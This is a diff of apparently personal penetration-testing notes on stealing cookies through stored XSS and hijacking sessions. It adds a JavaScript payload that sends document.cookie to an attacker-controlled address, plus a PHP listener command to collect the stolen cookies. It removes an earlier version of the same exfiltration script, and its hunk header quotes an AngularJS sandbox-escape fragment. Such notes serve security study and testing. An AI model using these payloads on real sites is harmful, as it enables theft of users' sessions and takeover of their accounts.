@@ -270,16 +270,23 @@ toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constru
 
 ### [[Cookies]] Stealing With XSS, Session Hijacking
 
+We are stealing a user's cookies and then using them to steal their logged in session.
+
 > JavaScript can only access [[Cookies]] if the `HttpOnly` flag is disabled. 
 > Cookies can be displayed with `<script>alert(document.cookie)</script>`.
 
-> To send cookies to a different website:
-```HTMl, JavaScript
-<script>document.location='URL-to-send-to/'+document.cookie</script>
-```
 > This is a stored attack, meaning it will be put in a place where users visit, so their cookies are stolen and sent to that website URL.
-
 > The subdomain of the cookie should be the same as the subdomain of the website in which the cookie is.
+
+> To send cookies to us:
+```JavaScript
+document.location='our-ip/'+document.cookie
+```
+
+This payload should be injected in the vulnerable XSS injection point. To start a listener:
+```bash
+sudo php -S 0.0.0.0:80
+```
 
 ---
 
